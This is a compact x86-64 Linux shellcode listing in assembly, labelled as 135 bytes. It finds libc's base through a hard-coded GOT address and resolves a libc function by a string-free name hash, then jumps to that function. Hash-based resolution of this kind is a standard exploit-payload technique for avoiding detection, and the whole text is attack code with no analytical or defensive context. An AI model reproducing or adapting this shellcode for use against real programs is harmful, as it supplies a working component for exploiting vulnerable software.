# 135 bytes

.section .data
.section .text
.global _start
 
_start:
  push $0x400130ff
  pop %rbx
  shr $0x8, %ebx
 
fast_got:
  mov (%rbx), %rcx
  add 0x10(%rbx), %rcx
 
extract_pointer:
  mov 0x20(%rcx), %rbx
 
find_base:
  dec %rbx
  cmpl $0x464c457f, (%rbx)
jne find_base
 
jmp startup
 
__initialize_world:
  pop %rcx
  jmp _world

 
# at this point, the base pointer of libc is in %rbx
startup:
  call __initialize_world
 

################
#
#  Takes a function hash in %rsi and base pointer in %rbx
#
#  returns a function pointer in %rbp
#
find_function:
  push %rdx
  xor %rdx, %rdx
  push %rdi
  push %rax
  push %rbx      
  push %rsi
  push %rbp
  pop %rdi
 
  read_dynamic_section:
    push %rbx
    pop %rbp

   push $0x4c
   pop %rax
   add (%rbx, %rax, 4), %rbx

  check_dynamic_type:
    add $0x10, %rbx
    cmpb $0x5, (%rbx)
  jne check_dynamic_type
 
  string_table_found:
    mov 0x8(%rbx), %rax       # %rax is now location of dynamic string table
    mov 0x18(%rbx), %rbx      # %rbx is now a pointer to the symbol table.
 
  check_next_hash:
    add $0x18, %rbx
    push %rdx
    pop %rsi
    xorw (%rbx), %si

    add %rax, %rsi
 
    calc_hash:
      push %rax
      push %rdx
 
      initialize_regs:
        push %rdx
        pop %rax
        cld
 
        calc_hash_loop:
          lodsb
          rol $0xc, %edx
          add %eax, %edx
          test %al, %al
          jnz calc_hash_loop
 
      calc_done:
        push %rdx
        pop %rsi

      pop %rdx 
      pop %rax

  cmp %esi, %edi

  jne check_next_hash
 
  found_hash:
    add 0x8(%rbx,%rdx,4), %rbp
    pop %rsi
    pop %rbx
    pop %rax
    pop %rdi
    pop %rdx
    push %rbp
ret

_world:
  push $0x696c4780
  pop %rbp
  xor %rdi, %rdi
  call *%rcx
